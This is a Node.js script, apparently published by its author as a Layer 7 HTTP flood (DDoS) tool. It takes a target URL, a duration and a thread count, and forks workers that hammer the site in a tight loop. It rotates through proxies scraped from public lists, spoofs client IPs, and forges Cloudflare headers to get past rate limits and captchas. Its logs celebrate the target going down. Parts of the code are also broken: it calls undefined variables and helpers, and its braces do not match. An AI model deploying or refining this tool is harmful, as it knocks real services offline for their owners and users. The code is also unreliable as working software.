//Custom L7 method
//developed by Vend3ttA
require('events').EventEmitter.defaultMaxListeners = 0;
const request = require('request'),
    axios = require('axios'),
    fs = require('fs'),
    fakeUa = require('fake-useragent'),
    cluster = require('cluster');
    url =  require('url'),
    randomstring = require('randomstring');

var path = require('path');
var fileName = __filename;
var f = path.basename(fileName);

const ip_spoof = () => {
    const getRandomByte = () => {
      return Math.floor(Math.random() * 255);
    };
    return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
  };
  const spoofed = ip_spoof();
async function main_process(){
    if(process.argv.length !== 6){
        console.log("usage: node " + f + " target time threads bypass\nScript made by Vend3ttA ~~Philippine CyberMafia~~" );
        process.exit(0);
    } else{
        const target = process.argv[2];
        const time = process.argv[3];
        const threads = process.argv[4];
        Array.prototype.remove_by_value = function(val){
            for(var i = 0; i < this.length; i++){
                if(this[i] === val) {
                    this.splice(i, 1);
                    i--;
                }
            }
            return this;
        }
        if(process.argv[5] == 'bypass'){
            console.log("[*] BYPASS METHOD");
        } else if(process.argv[5] == 'proxy'){
            console.log("[*] PROXY REQUEST ATTACK METHOD");
            const proxyscrape_http = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
            const proxy_list_http = await axios.get('https://www.proxy-list.download/api/v1/get?type=http');
            const raw_github_http = await axios.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
            const proxyspacepro = await axios.get('https://proxyspace.pro/http.txt');
            const multiproxy = await axios.get('https://multiproxy.org/txt_all/proxy.txt');
            const voidevs = await axios.get('https://api.voidevs.com/v1/proxy-list?protocol=http');
            const voidevsall = await axios.get('https://api.voidevs.com/v1/proxy-list?protocol=all');
            const proxyscrape_httpv2 = await axios.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&ssl=yes');
            const eliteproxy = await axios.get('https://www.proxy-list.download/api/v1/get?type=http&anon=elite');
            const kangproxy = await axios.get('https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt');
            var proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n');
            var proxies = proxy_list_http.data.replace(/\r/g, '').split('\n');
            var proxies = raw_github_http.data.replace(/\r/g, '').split('\n');
            var proxies = proxyspacepro.data.replace(/\r/g, '').split('\n');
            var proxies = multiproxy.data.replace(/\r/g, '').split('\n');
            var proxies = voidevs.data.replace(/\r/g, '').split('\n');
            var proxies = voidevsall.data.replace(/\r/g, '').split('\n');
            var proxies = proxyscrape_httpv2.data.replace(/\r/g, '').split('\n');
            var proxies = eliteproxy.data.replace(/\r/g, '').split('\n');
            var proxies = kangproxy.data.replace(/\r/g, '').split('\n');
        } else{
            console.log("[*] PROXY REQUEST ATTACK METHOD")
            var proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/g, '').split('\n');
            var proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n');
            var proxies = proxy_list_http.data.replace(/\r/g, '').split('\n');
            var proxies = raw_github_http.data.replace(/\r/g, '').split('\n');
            var proxies = proxyspacepro.data.replace(/\r/g, '').split('\n');
            var proxies = multiproxy.data.replace(/\r/g, '').split('\n');
            var proxies = voidevs.data.replace(/\r/g, '').split('\n');
            var proxies = voidevsall.data.replace(/\r/g, '').split('\n');
            var proxies = proxyscrape_httpv2.data.replace(/\r/g, '').split('\n');
            var proxies = eliteproxy.data.replace(/\r/g, '').split('\n');
            var proxies = kangproxy.data.replace(/\r/g, '').split('\n');

        }

        function run(){
            if(process.argv[5] !== 'bypass'){
                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var proxiedRequest = request.defaults({'proxy': 'http://'+proxy});
                var config = {
                    method: 'head',
                    url: target,
                    headers: {
                        'Cache-Control' : 'no-cache',
                        'User-Agent' : fakeUa(),
                        'A-IM': 'Feed',
                        'accept': 'accept',
                        'User-Agent': fakeUa(),
                        'accept-charset': 'accept',
                        'accept-datetime' : 'accept',
                        'accept-encoding' : 'encoding',
                        'accept-language' : 'lang',
                        'upgrade-insecure-requests' : '1',
                        'Access-Control-Request-Method' : 'GET',
                        'Access-Control-Request-Method' : 'POST',
                        'Cache-Control' : 'no-cache',
                        'Content-Encoding' : 'gzip',
                        'content-type' : 'text/html',
                        'cookie' : randstr(15),
                        'Expect' : '100-continue',
                        'Forwarded' : 'for=192.168.0.1;proto=http;by=' + spoofed,
                        'from' : 'user@gmail.com',
                        'Max-Forwards' : '10',
                        'origin' : 'https://' + parsedTarget.host,
                        'pragma' : 'no-cache',
                        'referer' : 'https://' + parsedTarget.host + '/',
                        'CF-Connecting-IP' : '192.168.0.1',
                        'CF-EW-Client-IP' : '192.168.0.1',
                        'CF-Challenge-Response' : generateRandomString(32),
                        'CF-Request-ID' : generateRandomString(24),
                        'CF-Ray' : '123456789abcdef0',
                        'CF-Visitor' : '{"scheme":"https"}',
                        'CF-Ratelimit-Remaining' : 'X',
                        'CF-Ratelimit-Limit' : 'Y'
                    
                    }//Captcha bypass and ratelimit credits kay xnder sa new headers
        
                    }
                }else {
                    var config = {
                        method: 'get',
                        url: target,
                        headers:{
                            'Cache-Control' : 'no-cache',
                            'User-Agent' : fakeUa(),
                            /*'A-IM': 'Feed', fuck! I remove it tng ina di nagana
                            'accept': 'accept',
                            'User-Agent': fakeUa(),
                            'accept-charset': 'accept',
                            'accept-datetime' : 'accept',
                            'accept-encoding' : 'encoding',
                            'accept-language' : 'lang',
                            'upgrade-insecure-requests' : '1',
                            'Access-Control-Request-Method' : 'GET',
                            'Access-Control-Request-Method' : 'POST',
                            'Cache-Control' : 'no-cache',
                            'Content-Encoding' : 'gzip',
                            'content-type' : 'text/html',
                            'cookie' : randstr(15),
                            'Expect' : '100-continue',
                            'Forwarded' : 'for=192.168.0.1;proto=http;by=' + spoofed,
                            'from' : 'user@gmail.com',
                            'Max-Forwards' : '10',
                            'origin' : 'https://' + parsedTarget.host,
                            'pragma' : 'no-cache',
                            'referer' : 'https://' + parsedTarget.host + '/',
                            'CF-Connecting-IP' : '192.168.0.1',
                            'CF-EW-Client-IP' : '192.168.0.1',
                            'CF-Challenge-Response' : generateRandomString(32),
                            'CF-Request-ID' : generateRandomString(24),
                            'CF-Ray' : '123456789abcdef0',
                            'CF-Visitor' : '{"scheme":"https"}',
                            'CF-Ratelimit-Remaining' : 'X',
                            'CF-Ratelimit-Limit' : 'Y'*/

                        }
                    };
                    request(config, function(error, response) {
                        console.log("BOOM BAGSAK SI TANGA ==>", target, response.statusCode)
                    });
                }
            }


    function thread(){
        setInterval(() => {
            run();
        });
    }
    async function main(){
        if(cluster.isMaster){
            for(let i = 0; i < threads; i++){
                cluster.fork();
                console.log(`ATTACK THREADS: ${i+1}`);
            }
        cluster.on('EXIT', function(){
            cluster.fork();
        });
        } else {
            thread();
        }
    }
    main();
    setTimeout(() => {
        console.log('ATTACK DONE!');
        process.exit(0)
    },time * 1000);

        
    }
}
process.on('uncaughtException', function(err) {
});
process.on('unhandledRejection', function(err) {
});
main_process();






